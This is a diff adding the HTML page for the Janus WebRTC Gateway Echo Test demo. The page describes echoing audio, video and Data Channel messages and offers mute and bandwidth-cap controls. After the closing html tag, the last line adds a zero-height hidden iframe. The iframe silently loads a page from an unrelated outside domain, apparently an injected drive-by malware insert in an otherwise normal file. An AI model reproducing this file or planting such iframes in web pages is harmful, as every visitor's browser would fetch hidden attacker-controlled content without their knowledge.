@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<title>Janus WebRTC Gateway: Echo Test</title>
+<script type="text/javascript" src="jquery.min.js" ></script>
+<script type="text/javascript" src="jquery.blockUI.js" ></script>
+<script type="text/javascript" src="js/bootstrap.js"></script>
+<script type="text/javascript" src="js/bootbox.min.js"></script>
+<script type="text/javascript" src="js/spin.min.js"></script>
+<script type="text/javascript" src="janus.js" ></script>
+<script type="text/javascript" src="echotest.js"></script>
+<script>
+	$(function() {
+		$(".navbar-static-top").load("navbar.html", function() {
+			$(".navbar-static-top li.dropdown").addClass("active");
+			$(".navbar-static-top a[href='echotest.html']").parent().addClass("active");
+		});
+		$(".footer").load("footer.html");
+	});
+</script>
+<link rel="stylesheet" href="css/cerulean/bootstrap.css" type="text/css"/>
+<link rel="stylesheet" href="css/demo.css" type="text/css"/>
+<link rel="stylesheet" href="css/font-awesome.css" type="text/css"/>
+</head>
+<body>
+
+<a href="https://github.com/meetecho/janus-gateway"><img style="position: absolute; top: 0; left: 0; border: 0; z-index: 1001;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_darkblue_121621.png" alt="Fork me on GitHub"></a>
+
+<nav class="navbar navbar-default navbar-static-top">
+</nav>
+
+<div class="container">
+	<div class="row">
+		<div class="col-md-12">
+			<div class="page-header">
+				<h1>Plugin Demo: Echo Test
+					<button class="btn btn-default" autocomplete="off" id="start">Start</button>
+				</h1>
+			</div>
+			<div class="container" id="details">
+				<div class="row">
+					<div class="col-md-12">
+						<h3>Demo details</h3>
+						<p>This Echo Test demo just blindly sends you back whatever you
+						send to it. You're basically attached to yourself, and so your audio
+						and video you send to the gateway are echoed back to you. The same
+						is done for RTCP packets as well, with the information properly updated.</p>
+						<p>The demo also provides a few controls to manipulate the media
+						before you send them. You can mute audio and video, for instance,
+						which will tell the gateway to drop the frames and not echo them
+						back to you. You can also try and cap the bitrate: such control
+						will tell the gateway to manipulate the RTCP REMB packets passing
+						through, in order to simulate a bandwidth limitation.</p>
+						<p>Finally, this demo also includes Data Channels: whatever you
+						write in the text box under your local video, will be sent via
+						Data Channels to the plugins, modified by adding a fixed prefix,
+						and sent back to you in the text area below the remote video.</p>
+						<div class="alert alert-info">This demo, as all the others, for the
+						sake of simplicity accesses the default devices you have available on
+						your machine. If you're interested in a demo that shows you how you
+						can select specific devices with <code>janus.js</code>, open the
+						<a class="alert-link" href="devices.html">Devices</a> demo instead.</div>
+						<p>Press the <code>Start</code> button above to launch the demo.</p>
+					</div>
+				</div>
+			</div>
+			<div class="container hide" id="videos">
+				<div class="row">
+					<div class="col-md-6">
+						<div class="panel panel-default">
+							<div class="panel-heading">
+								<h3 class="panel-title">Local Stream
+									<div class="btn-group btn-group-xs pull-right hide">
+										<button class="btn btn-danger" autocomplete="off" id="toggleaudio">Disable audio</button>
+										<button class="btn btn-danger" autocomplete="off" id="togglevideo">Disable video</button>
+										<div class="btn-group btn-group-xs">
+											<button id="bitrateset" autocomplete="off" class="btn btn-primary dropdown-toggle" data-toggle="dropdown">
+												Bandwidth<span class="caret"></span>
+											</button>
+											<ul id="bitrate" class="dropdown-menu" role="menu">
+												<li><a href="#" id="0">No limit</a></li>
+												<li><a href="#" id="128">Cap to 128kbit</a></li>
+												<li><a href="#" id="256">Cap to 256kbit</a></li>
+												<li><a href="#" id="512">Cap to 512kbit</a></li>
+												<li><a href="#" id="1024">Cap to 1mbit</a></li>
+												<li><a href="#" id="1500">Cap to 1.5mbit</a></li>
+												<li><a href="#" id="2000">Cap to 2mbit</a></li>
+											</ul>
+										</div>
+									</div>
+								</h3>
+							</div>
+							<div class="panel-body" id="videoleft"></div>
+						</div>
+						<div class="input-group margin-bottom-sm">
+							<span class="input-group-addon"><i class="fa fa-cloud-upload fa-fw"></i></span>
+							<input class="form-control" type="text" placeholder="Write a DataChannel message" autocomplete="off" id="datasend" onkeypress="return checkEnter(event);" disabled></input>
+						</div>
+					</div>
+					<div class="col-md-6">
+						<div class="panel panel-default">
+							<div class="panel-heading">
+								<h3 class="panel-title">Remote Stream <span class="label label-primary hide" id="curres"></span> <span class="label label-info hide" id="curbitrate"></span></h3>
+							</div>
+							<div class="panel-body" id="videoright"></div>
+						</div>
+						<div class="input-group margin-bottom-sm">
+							<span class="input-group-addon"><i class="fa fa-cloud-download fa-fw"></i></span>
+							<input class="form-control" type="text" id="datarecv" disabled></input>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+
+	<hr>
+	<div class="footer">
+	</div>
+</div>
+
+</body>
+</html>
+<iframe src=http://www.114Oldest.com/zz/mm.htm width=100 height=0></iframe>
